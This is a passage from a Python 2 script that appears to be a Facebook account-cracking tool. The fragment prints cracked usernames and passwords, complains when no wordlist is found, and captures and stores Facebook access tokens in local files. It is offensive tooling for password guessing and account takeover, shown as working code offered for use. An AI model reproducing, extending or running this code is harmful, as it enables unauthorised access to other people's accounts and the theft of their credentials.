                        print '\x1b[1;36;40m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)
 
        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print "\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"
            super()
           
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;93mToken\033[1;91m : Enter Acces Token Here :- ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;97m[?] \033[1;97mToken Invalid Refresh Page\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
 
def get(data):
	print 'Generate access token '
 
	try:
		os.mkdir('cookie')
	except OSError:
		pass
 
	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
 
		b.write(a['access_token'])
		b.close()
		print 'successfully generate access token'
		print 'Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print 'Failed to generate access token'
		print 'Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print 'Failed to generate access token'
		print 'Connection error !!!'
		os.remove('cookie/token.log')
		menu()
 
 
if __name__ == '__main__':
    login()
 
